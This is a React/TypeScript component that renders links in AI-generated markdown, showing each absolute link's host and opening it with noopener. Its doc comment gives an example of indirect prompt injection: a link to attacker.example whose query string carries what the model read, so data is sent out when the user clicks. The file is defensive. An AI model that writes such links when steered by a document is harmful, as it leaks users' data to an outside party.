import type { ComponentProps } from "react";

/**
 * The host an absolute http(s) link leads to, or null (relative links, anchors, mailto:).
 */
export function linkHost(href: string | undefined): string | null {
  if (!href || !/^https?:\/\//i.test(href)) return null;
  try {
    return new URL(href).host;
  } catch {
    return null;
  }
}

/**
 * A link in text a model wrote. Opened in a new tab without opener access, and an absolute link
 * shows where it goes next to its text: a model steered by a document can write
 * `[the policy](https://attacker.example/?d=<what it read>)`, and the reader should see the host
 * before clicking (docs/security/owasp-llm-top10.md, LLM05). Images are never loaded at all
 * (markdown-image.tsx).
 */
export function MarkdownLink(props: ComponentProps<"a"> & { node?: unknown }) {
  // react-markdown passes the hast `node`; it must not reach the DOM.
  const { href, children, ...rest } = { ...props, node: undefined };
  delete rest.node;
  const host = linkHost(href);
  const text = typeof children === "string" ? children : "";
  const showHost = host !== null && !text.includes(host);
  return (
    <>
      <a {...rest} href={href} target="_blank" rel="noopener noreferrer nofollow" className="underline underline-offset-2">
        {children}
      </a>
      {showHost ? <span className="ml-0.5 text-xs text-muted-foreground">({host})</span> : null}
    </>
  );
}
